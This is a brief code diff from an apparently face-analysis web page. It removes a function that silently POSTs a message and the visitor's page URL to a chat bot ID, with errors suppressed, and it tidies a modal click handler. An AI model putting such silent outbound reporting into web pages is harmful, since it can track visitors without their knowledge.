-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `✨ BeautyVerse AI (Face++) ✨\n${message}\n🌐 ${window.location.href}` })
-                });
-            } catch(e) {}
-        }
-        
-        window.onclick = function(event) {
+
+        window.onclick = (event) => {
             const modal = document.getElementById('analysisModal');
             if (event.target === modal) closeModal();
         };
